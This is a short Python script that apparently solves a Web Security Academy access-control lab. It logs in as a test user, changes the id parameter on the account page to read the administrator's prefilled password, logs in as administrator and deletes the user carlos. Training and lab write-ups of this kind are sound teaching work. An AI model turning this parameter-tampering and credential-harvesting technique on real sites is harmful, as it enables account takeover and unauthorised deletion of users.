'''This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
'''

lab_id = '0adf003c032597d98138628200a7009b' # change according to generated lab_id

import requests
from bs4 import BeautifulSoup


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def pwd_extract(resp): # function for getting the admin password
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'password'})['value']


def main():
    # first login as weiner:peter as instructed
    s = requests.session()
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r1 = s.get(uri) 
    token = token_extract(r1.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }
    r2 = s.post(uri, data=data)
    
    # We can view the account details of the administrator account once logged in
    uri = f"https://{lab_id}.web-security-academy.net/my-account?id=administrator"
    r3 = s.get(uri)
    
    # The password is pre filled out in the update password form. let's extract it.
    password = pwd_extract(r3.text)
        
    # Now we can login as administrator
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r4 = s.get(uri) 
    token = token_extract(r4.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "administrator",
            'password' : password,
            'csrf': token
    }
    r5 = s.post(uri, data=data)

    # And delete carlos
    uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
    r6 = s.get(uri)
    print('finished')

if __name__ == '__main__':
    main()
